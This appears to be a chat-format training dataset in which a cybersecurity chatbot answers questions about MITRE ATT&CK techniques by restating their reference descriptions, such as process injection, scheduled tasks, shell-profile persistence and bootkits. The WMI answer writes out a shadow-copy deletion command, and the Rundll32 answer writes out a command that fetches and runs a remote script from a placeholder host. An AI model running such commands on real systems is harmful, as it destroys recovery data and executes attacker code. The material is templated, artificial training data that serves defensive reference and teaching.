{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Extra Window Memory Injection' and with the Id: T1055.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Extra Window Memory Injection' and with the Id: T1055.011 is described as follows: Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Scheduled Task' and with the Id: T1053.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Scheduled Task' and with the Id: T1053.005 is described as follows: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.The deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)Adversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Socket Filters' and with the Id: T1205.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Socket Filters' and with the Id: T1205.002 is described as follows: Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indicator Removal from Tools' and with the Id: T1066 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indicator Removal from Tools' and with the Id: T1066 is described as follows: If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [Software Packing](https://attack.mitre.org/techniques/T1045) or otherwise modify the file so it has a different signature, and then re-use the malware.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Archive via Utility' and with the Id: T1560.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Archive via Utility' and with the Id: T1560.001 is described as follows: Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'VNC' and with the Id: T1021.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'VNC' and with the Id: T1021.005 is described as follows: Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\u201cremote framebuffer\u201d) protocol to enable users to remotely control another computer\u2019s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Management Instrumentation' and with the Id: T1047 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Management Instrumentation' and with the Id: T1047 is described as follows: Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components.The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI)An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6)**Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being \u201cdisabled by default\u201d on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious Shell Modification' and with the Id: T1156 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious Shell Modification' and with the Id: T1156 is described as follows: Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command line interface or remotely logs in (such as SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use <code>/etc/profile</code> when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files (Citation: intezer-kaiji-malware). These files require root permissions and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> (Rocke) which are sourced when a user opens a command line interface or connects remotely. Adversaries often use ~/.bash_profile since the system only executes the first file that exists in the listed order. Adversaries have also leveraged the <code>~/.bashrc</code> file (Tsunami, Rocke, Linux Rabbit, Magento) which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command line interface. Some malware targets the termination of a program to trigger execution (Cannon), adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session(Pearl_shellbot). For macOS, the functionality of this technique is similar but leverages zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>. The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc<code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Screen Capture' and with the Id: T1113 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Screen Capture' and with the Id: T1113 is described as follows: Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated Mac Malware). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Fileless Storage' and with the Id: T1027.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Fileless Storage' and with the Id: T1027.011 is described as follows: Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless)Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.Some forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.(Citation: Microsoft Fileless) . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bootkit' and with the Id: T1067 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bootkit' and with the Id: T1067 is described as follows: A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.### Master Boot RecordThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)### Volume Boot RecordThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.. The systems targeted by this attack pattern are: Linux, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Boot or Logon Initialization Scripts' and with the Id: T1037 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Boot or Logon Initialization Scripts' and with the Id: T1037 is described as follows: Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  Adversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. An adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.. The systems targeted by this attack pattern are: macOS, Windows, Linux, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Adversary-in-the-Middle' and with the Id: T1557 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Adversary-in-the-Middle' and with the Id: T1557 is described as follows: Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).. The systems targeted by this attack pattern are: Windows, macOS, Linux, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Owner/User Discovery' and with the Id: T1033 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Owner/User Discovery' and with the Id: T1033 is described as follows: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Various utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018). The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Acquire Infrastructure' and with the Id: T1583 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Acquire Infrastructure' and with the Id: T1583 is described as follows: Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rundll32' and with the Id: T1218.011 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rundll32' and with the Id: T1218.011 is described as follows: Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).Rundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).Additionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Container and Resource Discovery' and with the Id: T1613 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Container and Resource Discovery' and with the Id: T1613 is described as follows: Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment\u2019s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary\u2019s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. . The systems targeted by this attack pattern are: Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Serverless' and with the Id: T1583.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Serverless' and with the Id: T1583.007 is described as follows: Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hidden Window' and with the Id: T1143 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hidden Window' and with the Id: T1143 is described as follows: Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.### WindowsThere are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  (Citation: PowerShell About 2019)### MacThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be\u00a0<code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.(Citation: Antiquated Mac Malware). The systems targeted by this attack pattern are: macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LC_LOAD_DYLIB Addition' and with the Id: T1161 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LC_LOAD_DYLIB Addition' and with the Id: T1161 is described as follows: Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies (Citation: Writing Bad Malware for OSX). There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time (Citation: Malware Persistence on OS X).. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Standard Encoding' and with the Id: T1132.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Standard Encoding' and with the Id: T1132.001 is described as follows: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding)(Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Embedded Payloads' and with the Id: T1027.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Embedded Payloads' and with the Id: T1027.009 is described as follows: Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.(Citation: Sentinel Labs) Adversaries may embed payloads in various file formats to hide payloads.(Citation: Microsoft Learn) This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.(Citation: GitHub PSImage) For example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.(Citation: Securelist Dtrack2) Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.(Citation: SentinelLabs reversing run-only applescripts 2021) Embedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.(Citation: Trend Micro) These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.(Citation: Malware Analysis Report ComRAT). The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
